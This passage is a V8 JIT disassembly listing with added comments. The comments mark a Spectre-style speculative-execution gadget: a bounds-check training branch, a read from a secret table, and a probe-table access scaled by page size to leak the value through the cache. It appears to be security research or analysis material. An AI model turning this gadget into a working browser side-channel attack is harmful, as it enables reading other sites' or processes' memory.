0x172490876f92   5f2  0f8526000000   jnz 0x172490876fbe  <+0x61e>
                  -- B80 start (in loop 57) --
0x172490876f98   5f8  4d8b79ff       REX.W movq r15,[r9-0x1]
0x172490876f9c   5fc  4d397d48       REX.W cmpq [r13+0x48] (root (0x3f3b16e02641 <Map[16]>)),r15
0x172490876fa0   600  0f840d000000   jz 0x172490876fb3  <+0x613>
                  -- B81 start (in loop 57) --
0x172490876fa6   606  6641817f0b8300 cmpw [r15+0xb],0x83
0x172490876fad   60d  0f85330b0000   jnz 0x172490877ae6  <+0x1146>
                  -- B82 start (in loop 57) --
                  -- B83 start (in loop 57) --
0x172490876fb3   613  c4c17b104107   vmovsd xmm0,[r9+0x7]
0x172490876fb9   619  e910000000     jmp 0x172490876fce  <+0x62e>
                  -- B84 start (in loop 57) --
0x172490876fbe   61e  4d8bf9         REX.W movq r15,r9
0x172490876fc1   621  49c1ef20       REX.W shrq r15, 32
0x172490876fc5   625  c5f957c0       vxorpd xmm0,xmm0,xmm0
0x172490876fc9   629  c4c17b2ac7     vcvtlsi2sd xmm0,xmm0,r15
                  -- B85 start (in loop 57) --
0x172490876fce   62e  448bd2         movl r10,rdx
0x172490876fd1   631  c5f157c9       vxorpd xmm1,xmm1,xmm1
0x172490876fd5   635  c4c1f32aca     vcvtqsi2sd xmm1,xmm1,r10
0x172490876fda   63a  c5fb59c1       vmulsd xmm0,xmm0,xmm1
                  -- <not inlined:1209> --
0x172490876fde   63e  4c8b7e2f       REX.W movq r15,[rsi+0x2f]
0x172490876fe2   642  c5fb118540ffffff vmovsd [rbp-0xc0],xmm0
0x172490876fea   64a  4d397da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),r15
0x172490876fee   64e  0f847c060000   jz 0x172490877670  <+0xcd0>
                  -- B86 start (in loop 57) --
                  -- <not inlined:1246> --
0x172490876ff4   654  c4e1fb2cd8     vcvttsd2siq rbx,xmm0
0x172490876ff9   659  4883fb01       REX.W cmpq rbx,0x1
0x172490876ffd   65d  0f80d8090000   jo 0x1724908779db  <+0x103b>
0x172490877003   663  8bdb           movl rbx,rbx
                  -- <not inlined:1232> --
0x172490877005   665  4c8bca         REX.W movq r9,rdx
0x172490877008   668  4509e1         orl r9,r12
                  -- <not inlined:1246> --
0x17249087700b   66b  410bd9         orl rbx,r9
0x17249087700e   66e  4d8bcf         REX.W movq r9,r15
0x172490877011   671  49c1e920       REX.W shrq r9, 32
0x172490877015   675  4133d9         xorl rbx,r9
0x172490877018   678  41f6c701       testb r15,0x1
0x17249087701c   67c  0f85c90a0000   jnz 0x172490877aeb  <+0x114b>
                  -- <not inlined:1214> --
0x172490877022   682  48c1e320       REX.W shlq rbx, 32
0x172490877026   686  48895e2f       REX.W movq [rsi+0x2f],rbx
                  -- <not inlined:1334> --
0x17249087702a   68a  488b5e4f       REX.W movq rbx,[rsi+0x4f]
                  -- <not inlined:1354> --
0x17249087702e   68e  49395da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rbx
0x172490877032   692  0f841e060000   jz 0x172490877656  <+0xcb6>
                  -- B87 start (in loop 57) --
                  -- <not inlined:1352> --
0x172490877038   698  f6c301         testb rbx,0x1
0x17249087703b   69b  0f85af0a0000   jnz 0x172490877af0  <+0x1150>
0x172490877041   6a1  48c1eb20       REX.W shrq rbx, 32
0x172490877045   6a5  83c301         addl rbx,0x1
0x172490877048   6a8  0f80a70a0000   jo 0x172490877af5  <+0x1155>
                  -- <not inlined:1368> --
0x17249087704e   6ae  4183fe00       cmpl r14,0x0
0x172490877052   6b2  0f84a20a0000   jz 0x172490877afa  <+0x115a>
                  -- <not inlined:1124> --
0x172490877058   6b8  4c8b8d50ffffff REX.W movq r9,[rbp-0xb0]
0x17249087705f   6bf  49c1e920       REX.W shrq r9, 32
                  -- <not inlined:1368> --
0x172490877063   6c3  4c8bf3         REX.W movq r14,rbx
0x172490877066   6c6  450faff1       imull r14,r9
0x17249087706a   6ca  0f808f0a0000   jo 0x172490877aff  <+0x115f>
0x172490877070   6d0  4c89b570ffffff REX.W movq [rbp-0x90],r14
0x172490877077   6d7  4183fe00       cmpl r14,0x0
0x17249087707b   6db  0f8443040000   jz 0x1724908774c4  <+0xb24>
                  -- B88 start (in loop 57) --
                  -- B90 start (in loop 57) --
                  -- <not inlined:1334> --
0x172490877081   6e1  498bde         REX.W movq rbx,r14
0x172490877084   6e4  48c1e320       REX.W shlq rbx, 32
0x172490877088   6e8  4c8bf9         REX.W movq r15,rcx
0x17249087708b   6eb  48b8e9276158ec2a0000 REX.W movq rax,0x2aec586127e9    ;; object: 0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>
0x172490877095   6f5  4c8bce         REX.W movq r9,rsi
0x172490877098   6f8  488bcb         REX.W movq rcx,rbx
0x17249087709b   6fb  498b55a0       REX.W movq rdx,[r13-0x60] (root (0x3f3b16e025b1 <undefined>))
0x17249087709f   6ff  488bd8         REX.W movq rbx,rax
0x1724908770a2   702  488bfa         REX.W movq rdi,rdx
0x1724908770a5   705  e8b648f5ff     call 0x1724907cb960  (CreateTypedArray)    ;; code: Builtin::CreateTypedArray
                  -- <not inlined:1490> --
0x1724908770aa   70a  488b5d80       REX.W movq rbx,[rbp-0x80]
0x1724908770ae   70e  488b4b3f       REX.W movq rcx,[rbx+0x3f]
                  -- <not inlined:1528> --
0x1724908770b2   712  49394da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rcx
0x1724908770b6   716  0f8454050000   jz 0x172490877610  <+0xc70>
                  -- B91 start (in loop 57) --
                  -- <not inlined:1526> --
0x1724908770bc   71c  f6c101         testb rcx,0x1
0x1724908770bf   71f  0f85440a0000   jnz 0x172490877b09  <+0x1169>
0x1724908770c5   725  488bd1         REX.W movq rdx,rcx
0x1724908770c8   728  48c1ea20       REX.W shrq rdx, 32
0x1724908770cc   72c  0faf9560ffffff imull rdx,[rbp-0xa0]                ;; i * page_size
0x1724908770d3   733  0f80350a0000   jo 0x172490877b0e  <+0x116e>
                  -- <not inlined:1523> --
0x1724908770d9   739  488bb568ffffff REX.W movq rsi,[rbp-0x98]
0x1724908770e0   740  48bf8147482509060000 REX.W movq rdi,0x60925484781  ;; object: 0x060925484781 <Map(UINT8_ELEMENTS)>
0x1724908770ea   74a  48397eff       REX.W cmpq [rsi-0x1],rdi
0x1724908770ee   74e  0f851f0a0000   jnz 0x172490877b13  <+0x1173>
0x1724908770f4   754  4c8b4617       REX.W movq r8,[rsi+0x17]
0x1724908770f8   758  4c8b4e0f       REX.W movq r9,[rsi+0xf]
0x1724908770fc   75c  448b5e33       movl r11,[rsi+0x33]
0x172490877100   760  4d8b4917       REX.W movq r9,[r9+0x17]
0x172490877104   764  413bd3         cmpl rdx,r11
0x172490877107   767  0f830b0a0000   jnc 0x172490877b18  <+0x1178>
0x17249087710d   76d  410fb61411     movzxbl rdx,[r9+rdx*1]              ;; access valid_access_indicator_array
0x172490877112   772  83fa00         cmpl rdx,0x0
0x172490877115   775  0f85e2000000   jnz 0x1724908771fd  <+0x85d>
                  -- B92 start (in loop 57) --
                  -- B93 start (in loop 57) --
                  -- <not inlined:1543> --
0x17249087711b   77b  83bd38ffffff00 cmpl [rbp-0xc8],0x0                 ;; !invalid_address check
0x172490877122   782  0f84d5000000   jz 0x1724908771fd  <+0x85d>
                  -- B94 start (in loop 57) --
                  -- B95 start (in loop 57) --
                  -- <not inlined:1598> --
0x172490877128   788  4c8b435f       REX.W movq r8,[rbx+0x5f]
0x17249087712c   78c  4d3945a8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),r8
0x172490877130   790  0f849b040000   jz 0x1724908775d1  <+0xc31>
                  -- B96 start (in loop 57) --
                  -- <not inlined:1610> --
0x172490877136   796  41f6c001       testb r8,0x1
0x17249087713a   79a  0f84dd090000   jz 0x172490877b1d  <+0x117d>
0x172490877140   7a0  493978ff       REX.W cmpq [r8-0x1],rdi
0x172490877144   7a4  0f85d8090000   jnz 0x172490877b22  <+0x1182>
0x17249087714a   7aa  498b5017       REX.W movq rdx,[r8+0x17]
0x17249087714e   7ae  4d8b480f       REX.W movq r9,[r8+0xf]
0x172490877152   7b2  458b4033       movl r8,[r8+0x33]
0x172490877156   7b6  4d8b4917       REX.W movq r9,[r9+0x17]
0x17249087715a   7ba  4c8b9d48ffffff REX.W movq r11,[rbp-0xb8]           ;; r11 <- fixed_index
0x172490877161   7c1  453bd8         cmpl r11,r8
0x172490877164   7c4  0f83bd090000   jnc 0x172490877b27  <+0x1187>
0x17249087716a   7ca  470fb60419     movzxbl r8,[r9+r11*1]               ;; r8 <- RAM[secret_table + fixed_index]; r9 = secret_table address
                  -- <not inlined:1781> --
0x17249087716f   7cf  4c8b4b2f       REX.W movq r9,[rbx+0x2f]
0x172490877173   7d3  4d394da8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),r9
0x172490877177   7d7  0f8423040000   jz 0x1724908775a0  <+0xc00>
                  -- B97 start (in loop 57) --
                  -- <not inlined:1820> --
0x17249087717d   7dd  c5fb2c9540ffffff vcvttsd2si rdx,[rbp-0xc0]
0x172490877185   7e5  c5f957c0       vxorpd xmm0,xmm0,xmm0
0x172490877189   7e9  c5fb2ac2       vcvtlsi2sd xmm0,xmm0,rdx
0x17249087718d   7ed  c5f92e8540ffffff vucomisd xmm0,[rbp-0xc0]
0x172490877195   7f5  0f8a91090000   jpe 0x172490877b2c  <+0x118c>
0x17249087719b   7fb  0f858b090000   jnz 0x172490877b2c  <+0x118c>
0x1724908771a1   801  83fa00         cmpl rdx,0x0
0x1724908771a4   804  0f8456030000   jz 0x172490877500  <+0xb60>
                  -- B98 start (in loop 57) --
                  -- B100 start (in loop 57) --
                  -- <not inlined:1804> --
0x1724908771aa   80a  4183c001       addl r8,0x1                         ;; r8 <- secret_value + 1
                  -- <not inlined:1820> --
0x1724908771ae   80e  410fafd0       imull rdx,r8                        ;; rdx <- (secret_value + 1) * fixed_page_size
0x1724908771b2   812  0f8079090000   jo 0x172490877b31  <+0x1191>
                  -- <not inlined:1800> --
0x1724908771b8   818  483978ff       REX.W cmpq [rax-0x1],rdi
0x1724908771bc   81c  0f8574090000   jnz 0x172490877b36  <+0x1196>
0x1724908771c2   822  4c8b4017       REX.W movq r8,[rax+0x17]
0x1724908771c6   826  4c8b600f       REX.W movq r12,[rax+0xf]
0x1724908771ca   82a  448b7033       movl r14,[rax+0x33]
0x1724908771ce   82e  4d8b642417     REX.W movq r12,[r12+0x17]
0x1724908771d3   833  413bd6         cmpl rdx,r14
0x1724908771d6   836  0f835f090000   jnc 0x172490877b3b  <+0x119b>
0x1724908771dc   83c  410fb61414     movzxbl rdx,[r12+rdx*1]             ;; r12 = probe_table address; rdx <- RAM[probe_table + (secret_value + 1) * fixed_page_size]
0x1724908771e1   841  4d8bc1         REX.W movq r8,r9
0x1724908771e4   844  49c1e820       REX.W shrq r8, 32
0x1724908771e8   848  4133d0         xorl rdx,r8                         ;; junk ^= ...
0x1724908771eb   84b  41f6c101       testb r9,0x1
0x1724908771ef   84f  0f854b090000   jnz 0x172490877b40  <+0x11a0>
                  -- <not inlined:1786> --
0x1724908771f5   855  48c1e220       REX.W shlq rdx, 32
0x1724908771f9   859  4889532f       REX.W movq [rbx+0x2f],rdx           ;; assign junk to RAM
                  -- B101 start (in loop 57) --
                  -- <not inlined:1891> --
0x1724908771fd   85d  83bd38ffffff00 cmpl [rbp-0xc8],0x0                 ;; invalid_address check
0x172490877204   864  0f854f000000   jnz 0x172490877259  <+0x8b9>
                  -- B102 start (in loop 57) --
0x17249087720a   86a  488b5337       REX.W movq rdx,[rbx+0x37]
                  -- <not inlined:1918> --
0x17249087720e   86e  493955a8       REX.W cmpq [r13-0x58] (root (0x3f3b16e02691 <the_hole>)),rdx
0x172490877212   872  0f8457030000   jz 0x17249087756f  <+0xbcf>
                  -- B103 start (in loop 57) --
                  -- <not inlined:1936> --
0x172490877218   878  f6c201         testb rdx,0x1
0x17249087721b   87b  0f8524090000   jnz 0x172490877b45  <+0x11a5>
0x172490877221   881  488bca         REX.W movq rcx,rdx
0x172490877224   884  48c1e920       REX.W shrq rcx, 32
0x172490877228   888  83e901         subl rcx,0x1                        ;; TRAINING_CONSTANT - 1
0x17249087722b   88b  0f8019090000   jo 0x172490877b4a  <+0x11aa>        ;; dont jump / overflow never occurs
                  -- <not inlined:771> --
0x172490877231   891  4c8b8578ffffff REX.W movq r8,[rbp-0x88]            ;; [rbp-0x88] is j // iteration variable
0x172490877238   898  49c1e820       REX.W shrq r8, 32
                  -- <not inlined:1915> --
0x17249087723c   89c  413bc8         cmpl rcx,r8                         ;; j == TRAINING_CONSTANT - 1
0x17249087723f   89f  0f8514000000   jnz 0x172490877259  <+0x8b9>
                  -- B104 start (in loop 57) --
                  -- B105 start (in loop 57) --
                  -- <not inlined:2045> --
0x172490877245   8a5  48b9f95ad3aa622d0000 REX.W movq rcx,0x2d62aad35af9    ;; object: 0x2d62aad35af9 <JSFunction probeTable (sfi = 0x39d88e2585a9)>
0x17249087724f   8af  48394b67       REX.W cmpq [rbx+0x67],rcx
0x172490877253   8b3  0f85f6080000   jnz 0x172490877b4f  <+0x11af>
                  -- B106 start (in loop 57) --
                  -- B107 start (in loop 57) --
0x172490877259   8b9  4c8b9528ffffff REX.W movq r10,[rbp-0xd8]
0x172490877260   8c0  4c899560ffffff REX.W movq [rbp-0xa0],r10
0x172490877267   8c7  488bce         REX.W movq rcx,rsi
0x17249087726a   8ca  488bf3         REX.W movq rsi,rbx
0x17249087726d   8cd  e9eefbffff     jmp 0x172490876e60  <+0x4c0>
                  -- B108 start (in loop 1) --
                  -- B109 start (in loop 1) --
0x172490877272   8d2  488b8578ffffff REX.W movq rax,[rbp-0x88]
0x172490877279   8d9  48c1e820       REX.W shrq rax, 32
                  -- <not inlined:771> --
0x17249087727d   8dd  83c001         addl rax,0x1
0x172490877280   8e0  0f80ce080000   jo 0x172490877b54  <+0x11b4>
                  -- <not inlined:748> --
0x172490877286   8e6  48c1e020       REX.W shlq rax, 32
0x17249087728a   8ea  488bde         REX.W movq rbx,rsi
0x17249087728d   8ed  48898578ffffff REX.W movq [rbp-0x88],rax
0x172490877294   8f4  e947f7ffff     jmp 0x1724908769e0  <+0x40>
                  -- B110 start (deconstruct frame) --
                  -- <not inlined:2100> --
0x172490877299   8f9  498b45a0       REX.W movq rax,[r13-0x60] (root (0x3f3b16e025b1 <undefined>))
0x17249087729d   8fd  488be5         REX.W movq rsp,rbp
0x1724908772a0   900  5d             pop rbp
0x1724908772a1   901  c20800         ret 0x8
                  -- B141 start (no frame) --
                  -- B4 start (deferred) (in loop 1) --
                  -- <not inlined:730> --
0x1724908772a4   904  48899d70ffffff REX.W movq [rbp-0x90],rbx
0x1724908772ab   90b  48bbb093190100000000 REX.W movq rbx,0x11993b0
0x1724908772b5   915  33c0           xorl rax,rax
0x1724908772b7   917  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908772bb   91b  e84088f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x1724908772c0   920  b801000000     movl rax,0x1
0x1724908772c5   925  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908772c9   929  488b9578ffffff REX.W movq rdx,[rbp-0x88]
0x1724908772d0   930  488b9d70ffffff REX.W movq rbx,[rbp-0x90]
0x1724908772d7   937  e946f7ffff     jmp 0x172490876a22  <+0x82>
                  -- B10 start (deferred) (in loop 1) --
                  -- <not inlined:864> --
0x1724908772dc   93c  0bf9           orl rdi,rcx
0x1724908772de   93e  48899d70ffffff REX.W movq [rbp-0x90],rbx
0x1724908772e5   945  83ff00         cmpl rdi,0x0
0x1724908772e8   948  0f8c70080000   jl 0x172490877b5e  <+0x11be>
0x1724908772ee   94e  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908772f2   952  488b9578ffffff REX.W movq rdx,[rbp-0x88]
0x1724908772f9   959  b801000000     movl rax,0x1
0x1724908772fe   95e  4c8b8568ffffff REX.W movq r8,[rbp-0x98]
0x172490877305   965  e96df7ffff     jmp 0x172490876a77  <+0xd7>
                  -- B15 start (deferred) (in loop 1) --
                  -- <not inlined:886> --
0x17249087730a   96a  48899d70ffffff REX.W movq [rbp-0x90],rbx
0x172490877311   971  488b1d95ffffff REX.W movq rbx,[rip+0xffffff95]
0x172490877318   978  33c0           xorl rax,rax
0x17249087731a   97a  488b7580       REX.W movq rsi,[rbp-0x80]
0x17249087731e   97e  e8dd87f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x172490877323   983  488b9d70ffffff REX.W movq rbx,[rbp-0x90]
0x17249087732a   98a  488b7580       REX.W movq rsi,[rbp-0x80]
0x17249087732e   98e  e9acf7ffff     jmp 0x172490876adf  <+0x13f>
                  -- B19 start (deferred) (in loop 1) --
                  -- <not inlined:987> --
0x172490877333   993  488bd0         REX.W movq rdx,rax
0x172490877336   996  f7da           negl rdx
0x172490877338   998  48899d70ffffff REX.W movq [rbp-0x90],rbx
0x17249087733f   99f  83f800         cmpl rax,0x0
0x172490877342   9a2  0f8420080000   jz 0x172490877b68  <+0x11c8>
0x172490877348   9a8  488b7580       REX.W movq rsi,[rbp-0x80]
0x17249087734c   9ac  488b9d70ffffff REX.W movq rbx,[rbp-0x90]
0x172490877353   9b3  488bca         REX.W movq rcx,rdx
0x172490877356   9b6  e997f7ffff     jmp 0x172490876af2  <+0x152>
                  -- B38 start (deferred) (in loop 1) --
                  -- <not inlined:1368> --
0x17249087735b   9bb  0bcb           orl rcx,rbx
0x17249087735d   9bd  83f900         cmpl rcx,0x0
0x172490877360   9c0  0f8c07080000   jl 0x172490877b6d  <+0x11cd>
0x172490877366   9c6  488b7580       REX.W movq rsi,[rbp-0x80]
0x17249087736a   9ca  488b8540ffffff REX.W movq rax,[rbp-0xc0]
0x172490877371   9d1  4c8b8570ffffff REX.W movq r8,[rbp-0x90]
0x172490877378   9d8  e90bf9ffff     jmp 0x172490876c88  <+0x2e8>
                  -- B48 start (deferred) (in loop 1) --
                  -- <not inlined:1820> --
0x17249087737d   9dd  48899538ffffff REX.W movq [rbp-0xc8],rdx
0x172490877384   9e4  c5fb108550ffffff vmovsd xmm0,[rbp-0xb0]
0x17249087738c   9ec  660f3a16c101   pextrd rcx,xmm0,1
0x172490877392   9f2  488b9560ffffff REX.W movq rdx,[rbp-0xa0]
0x172490877399   9f9  498bfb         REX.W movq rdi,r11
0x17249087739c   9fc  83f900         cmpl rcx,0x0
0x17249087739f   9ff  0f8ccd070000   jl 0x172490877b72  <+0x11d2>
0x1724908773a5   a05  4c898d70ffffff REX.W movq [rbp-0x90],r9
0x1724908773ac   a0c  4c898548ffffff REX.W movq [rbp-0xb8],r8
0x1724908773b3   a13  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908773b7   a17  488b8d68ffffff REX.W movq rcx,[rbp-0x98]
0x1724908773be   a1e  4c8bdf         REX.W movq r11,rdi
0x1724908773c1   a21  48bf8147482509060000 REX.W movq rdi,0x60925484781    ;; object: 0x060925484781 <Map(UINT8_ELEMENTS)>
0x1724908773cb   a2b  488b9538ffffff REX.W movq rdx,[rbp-0xc8]
0x1724908773d2   a32  e9ccf9ffff     jmp 0x172490876da3  <+0x403>
                  -- B60 start (deferred) (in loop 57) --
                  -- <not inlined:886> --
0x1724908773d7   a37  48898550ffffff REX.W movq [rbp-0xb0],rax
0x1724908773de   a3e  488b1dc8feffff REX.W movq rbx,[rip+0xfffffec8]
0x1724908773e5   a45  33c0           xorl rax,rax
0x1724908773e7   a47  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908773eb   a4b  e81087f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x1724908773f0   a50  488b8550ffffff REX.W movq rax,[rbp-0xb0]
0x1724908773f7   a57  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908773fb   a5b  488b8d68ffffff REX.W movq rcx,[rbp-0x98]
0x172490877402   a62  488b9d70ffffff REX.W movq rbx,[rbp-0x90]
0x172490877409   a69  4c8b8560ffffff REX.W movq r8,[rbp-0xa0]
0x172490877410   a70  48bf8147482509060000 REX.W movq rdi,0x60925484781    ;; object: 0x060925484781 <Map(UINT8_ELEMENTS)>
0x17249087741a   a7a  e983faffff     jmp 0x172490876ea2  <+0x502>
                  -- B64 start (deferred) (in loop 57) --
                  -- <not inlined:987> --
0x17249087741f   a7f  48898550ffffff REX.W movq [rbp-0xb0],rax
0x172490877426   a86  f7d8           negl rax
0x172490877428   a88  83bd50ffffff00 cmpl [rbp-0xb0],0x0
0x17249087742f   a8f  0f8447070000   jz 0x172490877b7c  <+0x11dc>
0x172490877435   a95  48899558ffffff REX.W movq [rbp-0xa8],rdx
0x17249087743c   a9c  488b7580       REX.W movq rsi,[rbp-0x80]
0x172490877440   aa0  488b8d68ffffff REX.W movq rcx,[rbp-0x98]
0x172490877447   aa7  488b9d70ffffff REX.W movq rbx,[rbp-0x90]
0x17249087744e   aae  4c8b8560ffffff REX.W movq r8,[rbp-0xa0]
0x172490877455   ab5  48bf8147482509060000 REX.W movq rdi,0x60925484781    ;; object: 0x060925484781 <Map(UINT8_ELEMENTS)>
0x17249087745f   abf  e953faffff     jmp 0x172490876eb7  <+0x517>
                  -- B70 start (deferred) (in loop 57) --
0x172490877464   ac4  498bdb         REX.W movq rbx,r11
0x172490877467   ac7  f7db           negl rbx
0x172490877469   ac9  48899558ffffff REX.W movq [rbp-0xa8],rdx
0x172490877470   ad0  83fa00         cmpl rdx,0x0
0x172490877473   ad3  0f850d000000   jnz 0x172490877486  <+0xae6>
                  -- B71 start (deferred) (in loop 57) --
0x172490877479   ad9  488bc3         REX.W movq rax,rbx
0x17249087747c   adc  33d2           xorl rdx,rdx
0x17249087747e   ade  41f7f1         divl r9
0x172490877481   ae1  e905000000     jmp 0x17249087748b  <+0xaeb>
                  -- B72 start (deferred) (in loop 57) --
0x172490877486   ae6  23c3           andl rax,rbx
0x172490877488   ae8  488bd0         REX.W movq rdx,rax
                  -- B73 start (deferred) (in loop 57) --
0x17249087748b   aeb  488bc2         REX.W movq rax,rdx
0x17249087748e   aee  f7d8           negl rax
0x172490877490   af0  83fa00         cmpl rdx,0x0
0x172490877493   af3  0f84e8060000   jz 0x172490877b81  <+0x11e1>
0x172490877499   af9  488b7580       REX.W movq rsi,[rbp-0x80]
0x17249087749d   afd  488b8d68ffffff REX.W movq rcx,[rbp-0x98]
0x1724908774a4   b04  488b9d70ffffff REX.W movq rbx,[rbp-0x90]
0x1724908774ab   b0b  4c8b8560ffffff REX.W movq r8,[rbp-0xa0]
0x1724908774b2   b12  48bf8147482509060000 REX.W movq rdi,0x60925484781    ;; object: 0x060925484781 <Map(UINT8_ELEMENTS)>
0x1724908774bc   b1c  488bd0         REX.W movq rdx,rax
0x1724908774bf   b1f  e932faffff     jmp 0x172490876ef6  <+0x556>
                  -- B89 start (deferred) (in loop 57) --
                  -- <not inlined:1368> --
0x1724908774c4   b24  440bcb         orl r9,rbx
0x1724908774c7   b27  4183f900       cmpl r9,0x0
0x1724908774cb   b2b  0f8cb5060000   jl 0x172490877b86  <+0x11e6>
0x1724908774d1   b31  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908774d5   b35  488b8d68ffffff REX.W movq rcx,[rbp-0x98]
0x1724908774dc   b3c  4c8b8560ffffff REX.W movq r8,[rbp-0xa0]
0x1724908774e3   b43  488b8538ffffff REX.W movq rax,[rbp-0xc8]
0x1724908774ea   b4a  48bf8147482509060000 REX.W movq rdi,0x60925484781    ;; object: 0x060925484781 <Map(UINT8_ELEMENTS)>
0x1724908774f4   b54  4c8bb570ffffff REX.W movq r14,[rbp-0x90]
0x1724908774fb   b5b  e981fbffff     jmp 0x172490877081  <+0x6e1>
                  -- B99 start (deferred) (in loop 57) --
                  -- <not inlined:1820> --
0x172490877500   b60  48899530ffffff REX.W movq [rbp-0xd0],rdx
0x172490877507   b67  c5fb108540ffffff vmovsd xmm0,[rbp-0xc0]
0x17249087750f   b6f  660f3a16c301   pextrd rbx,xmm0,1
0x172490877515   b75  488b9558ffffff REX.W movq rdx,[rbp-0xa8]
0x17249087751c   b7c  4d8be3         REX.W movq r12,r11
0x17249087751f   b7f  83fb00         cmpl rbx,0x0
0x172490877522   b82  0f8c63060000   jl 0x172490877b8b  <+0x11eb>
0x172490877528   b88  4c898d70ffffff REX.W movq [rbp-0x90],r9
0x17249087752f   b8f  4c898550ffffff REX.W movq [rbp-0xb0],r8
0x172490877536   b96  488b5d80       REX.W movq rbx,[rbp-0x80]
0x17249087753a   b9a  488bb568ffffff REX.W movq rsi,[rbp-0x98]
0x172490877541   ba1  4d89e3         REX.W movq r11,r12
0x172490877544   ba4  48bf8147482509060000 REX.W movq rdi,0x60925484781    ;; object: 0x060925484781 <Map(UINT8_ELEMENTS)>
0x17249087754e   bae  488b9530ffffff REX.W movq rdx,[rbp-0xd0]
0x172490877555   bb5  e950fcffff     jmp 0x1724908771aa  <+0x80a>
                  -- B111 start (deferred) --
0x17249087755a   bba  48899d58ffffff REX.W movq [rbp-0xa8],rbx
0x172490877561   bc1  33d2           xorl rdx,rdx
0x172490877563   bc3  48899560ffffff REX.W movq [rbp-0xa0],rdx
0x17249087756a   bca  e907000000     jmp 0x172490877576  <+0xbd6>
                  -- B112 start (deferred) --
0x17249087756f   bcf  48899558ffffff REX.W movq [rbp-0xa8],rdx
                  -- B113 start (deferred) --
0x172490877576   bd6  48898570ffffff REX.W movq [rbp-0x90],rax
0x17249087757d   bdd  48b8f180258ed8390000 REX.W movq rax,0x39d88e2580f1    ;; object: 0x39d88e2580f1 <String[17]: TRAINING_CONSTANT>
0x172490877587   be7  50             push rax
                  -- <not inlined:1918> --
0x172490877588   be8  48bb108c190100000000 REX.W movq rbx,0x1198c10
0x172490877592   bf2  b801000000     movl rax,0x1
0x172490877597   bf7  488b7580       REX.W movq rsi,[rbp-0x80]
0x17249087759b   bfb  e86085f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B114 start (deferred) --
0x1724908775a0   c00  488b9558ffffff REX.W movq rdx,[rbp-0xa8]
0x1724908775a7   c07  c5fb108540ffffff vmovsd xmm0,[rbp-0xc0]
0x1724908775af   c0f  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x1724908775b6   c16  4c899548ffffff REX.W movq [rbp-0xb8],r10
0x1724908775bd   c1d  48899560ffffff REX.W movq [rbp-0xa0],rdx
0x1724908775c4   c24  c5fb118558ffffff vmovsd [rbp-0xa8],xmm0
0x1724908775cc   c2c  e948010000     jmp 0x172490877719  <+0xd79>
                  -- B115 start (deferred) --
0x1724908775d1   c31  488b9558ffffff REX.W movq rdx,[rbp-0xa8]
0x1724908775d8   c38  4c8ba548ffffff REX.W movq r12,[rbp-0xb8]
0x1724908775df   c3f  c5fb108540ffffff vmovsd xmm0,[rbp-0xc0]
0x1724908775e7   c47  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x1724908775ee   c4e  4c899548ffffff REX.W movq [rbp-0xb8],r10
0x1724908775f5   c55  48899570ffffff REX.W movq [rbp-0x90],rdx
0x1724908775fc   c5c  4c89a560ffffff REX.W movq [rbp-0xa0],r12
0x172490877603   c63  c5fb118558ffffff vmovsd [rbp-0xa8],xmm0
0x17249087760b   c6b  e973010000     jmp 0x172490877783  <+0xde3>
                  -- B116 start (deferred) --
0x172490877610   c70  488b9558ffffff REX.W movq rdx,[rbp-0xa8]
0x172490877617   c77  4c8ba548ffffff REX.W movq r12,[rbp-0xb8]
0x17249087761e   c7e  c5fb108540ffffff vmovsd xmm0,[rbp-0xc0]
0x172490877626   c86  48898d40ffffff REX.W movq [rbp-0xc0],rcx
0x17249087762d   c8d  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x172490877634   c94  4c899548ffffff REX.W movq [rbp-0xb8],r10
0x17249087763b   c9b  48899570ffffff REX.W movq [rbp-0x90],rdx
0x172490877642   ca2  4c89a560ffffff REX.W movq [rbp-0xa0],r12
0x172490877649   ca9  c5fb118558ffffff vmovsd [rbp-0xa8],xmm0
0x172490877651   cb1  e999010000     jmp 0x1724908777ef  <+0xe4f>
                  -- B117 start (deferred) --
0x172490877656   cb6  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x17249087765d   cbd  4c899550ffffff REX.W movq [rbp-0xb0],r10
0x172490877664   cc4  4c89a560ffffff REX.W movq [rbp-0xa0],r12
0x17249087766b   ccb  e9b8010000     jmp 0x172490877828  <+0xe88>
                  -- B118 start (deferred) --
0x172490877670   cd0  4c89bd48ffffff REX.W movq [rbp-0xb8],r15
0x172490877677   cd7  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x17249087767e   cde  4c899550ffffff REX.W movq [rbp-0xb0],r10
0x172490877685   ce5  c57b10bd40ffffff vmovsd xmm15,[rbp-0xc0]
0x17249087768d   ced  c57b11bd58ffffff vmovsd [rbp-0xa8],xmm15
0x172490877695   cf5  4c89a560ffffff REX.W movq [rbp-0xa0],r12
